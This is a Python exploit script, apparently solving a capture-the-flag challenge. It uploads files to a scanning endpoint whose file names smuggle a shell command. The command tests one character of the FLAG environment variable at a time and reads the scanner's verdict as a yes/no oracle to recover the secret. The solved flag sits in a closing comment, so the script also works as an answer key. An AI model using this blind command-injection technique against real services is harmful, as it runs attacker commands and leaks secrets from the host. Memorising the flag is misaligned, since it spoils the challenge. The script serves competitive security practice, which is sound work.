import requests
import string

url = "https://bf56d647-505a-4120-9904-fe382b01ca18.offsec.m0lecon.it/scan"
stringa=string.ascii_letters +string.digits+"}{-_"
flag=""
for i in range(1,47):
    for c in stringa:
        print(f"\r {i} {c}",end="")
        payload = f'eicar.txt; if [ "$(echo $FLAG | cut -c {i})" = "{c}" ]; then exit 1; else exit 0; fi; #'

        files = {
            'specimen': (payload, '', 'text/plain') #tupla filename, contenuto file e content type
        }
        response = requests.post(url, files=files)


        if "NO THREATS DETECTED" in response.text:
            pass
        else:
            print(c,end="")
            break
    flag+=c
    print("\rFLAG: ",flag,end="")

    #offsec{bl1nd_cl4m_1nj3ct_8k41iNCky7a211Ef}
